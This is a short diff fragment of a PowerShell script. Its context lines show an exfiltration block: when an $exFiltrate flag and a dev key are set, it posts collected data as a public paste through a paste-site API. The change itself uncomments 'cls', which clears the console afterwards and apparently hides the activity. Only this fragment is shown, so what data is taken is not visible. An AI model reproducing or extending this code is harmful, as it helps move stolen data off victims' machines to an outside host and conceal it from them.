@@ -340,4 +340,4 @@ if($exFiltrate -eq 1 -and ![string]::IsNullOrEmpty($dev_key)) {
     $parameters = "&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
     Post-HttpRequest $url $parameters
 }
-#cls
+cls
